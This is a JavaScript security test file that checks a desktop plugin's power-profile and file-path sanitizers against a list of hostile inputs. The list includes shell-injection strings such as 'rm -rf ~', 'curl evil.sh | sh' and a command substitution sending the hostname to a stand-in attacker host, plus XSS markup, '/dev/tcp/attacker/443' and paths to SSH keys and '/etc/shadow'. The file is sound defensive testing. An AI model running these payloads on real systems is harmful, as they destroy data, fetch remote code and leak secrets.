// Adversarial input: values that could reach a command, an argument vector or
// a path.
//
// Everything this plugin reads was written by something else: a daemon, a media
// player registered by any application on the session bus, a file the user can
// edit, a kernel interface. This file assumes all of it is hostile and checks
// that the worst an attacker gets is a wrong-looking card.
//
// The two things that must never happen: a value reaching an argument vector
// that was not on an allowlist, and a value reaching a renderer that could
// interpret it.
var t = require("./harness.js")
var Arrange = require("../model/Arrange.js")
var DateTime = require("../model/DateTime.js")
var Media = require("../model/Media.js")
var Pods = require("../model/Pods.js")
var Power = require("../model/Power.js")
var Probe = require("../model/Probe.js")
var Settings = require("../model/Settings.js")
var Sysfs = require("../model/Sysfs.js")
var Todo = require("../model/Todo.js")
var TodoList = require("../model/TodoList.js")

// Payloads that matter if a value ever reaches a shell, an argv, a path, or a
// renderer that interprets markup.
var HOSTILE = [
  "; rm -rf ~", "&& curl evil.sh | sh", "| tee /etc/passwd", "$(id)", "`id`",
  "$(curl attacker/$(hostname))", "--help", "-rf", "--exec=id", "\n/bin/sh",
  "a\u0000b", "../../etc/passwd", "/etc/shadow", "file:///etc/passwd",
  "<img src=x onerror=alert(1)>", "<a href='file:///etc/passwd'>x</a>",
  "<b>bold</b>", "&lt;script&gt;", "‮evil", "%n%n%n", "{{7*7}}",
  "__proto__", "constructor", "prototype"
]

// ------------------------------------------------- the only write: profiles

// Setting the power profile is the one thing that changes system state. Nothing
// but the three names power-profiles-daemon defines may reach that argv.
var offered = ["power-saver", "balanced", "performance"]
var leaked = []
for (var i = 0; i < HOSTILE.length; i++) {
  if (Power.sanitizeProfile(HOSTILE[i], offered) !== "") leaked.push(HOSTILE[i])
  // Also as a suffix and a prefix of a legitimate name.
  if (Power.sanitizeProfile("balanced" + HOSTILE[i], offered) !== "") leaked.push("balanced" + HOSTILE[i])
  if (Power.sanitizeProfile(HOSTILE[i] + "balanced", offered) !== "") leaked.push(HOSTILE[i] + "balanced")
}
t.deep(leaked, [], "no hostile string reaches the power-profile argv")
t.eq(Power.sanitizeProfile("balanced", ["balanced; rm -rf ~"]), "",
  "a daemon that reports a hostile profile name cannot smuggle it back in either")
t.deep(Power.parseProfileList("balanced; rm -rf ~\t1\n$(id)\t0\n").profiles, [],
  "and such a name never enters the list in the first place")

// ------------------------------------------------------ paths that are run

// A path from the probe is used to open a file or, for nvidia-smi, to run a
// program. Neither may wander.
var escapes = ["/etc/passwd", "/home/user/.ssh/id_rsa", "/sys/../etc/passwd",
  "/proc/../etc/shadow", "../../etc/passwd", "/tmp/evil", "/dev/tcp/attacker/443",
  "/sys/class/../../etc/passwd", "sys/relative", "", "   ", "/usr/bin/evil"]
var accepted = []
for (var e = 0; e < escapes.length; e++) {
  var got = Probe.path(Probe.parse("p\t" + escapes[e]), "p")
  if (got !== "") accepted.push(escapes[e] + " -> " + got)
}
t.deep(accepted, [], "no path outside /sys and /proc is accepted, and none containing ..")
t.eq(Probe.path(Probe.parse("p\t/sys/class/hwmon/hwmon0/temp1_input"), "p"),
  "/sys/class/hwmon/hwmon0/temp1_input", "a real sysfs path still passes")

// A helper binary is a different allowlist from a sysfs file: it is run, not
// read, so it is pinned to the one program the probe looks for.
t.eq(Probe.program(Probe.parse("gpu.nvidiaSmi\t/usr/bin/nvidia-smi"), "gpu.nvidiaSmi"),
  "/usr/bin/nvidia-smi", "the one helper this plugin runs is allowed")
var programEscapes = []
for (var g = 0; g < escapes.length; g++) {
  if (Probe.program(Probe.parse("p\t" + escapes[g]), "p") !== "") programEscapes.push(escapes[g])
}
programEscapes.push.apply(programEscapes, HOSTILE.filter(function (h) {
  return Probe.program(Probe.parse("p\t" + h.replace(/[\t\n]/g, " ")), "p") !== ""
}))
t.deep(programEscapes, [], "nothing else can become a program this plugin runs")

process.exit(t.report("security:exec"))
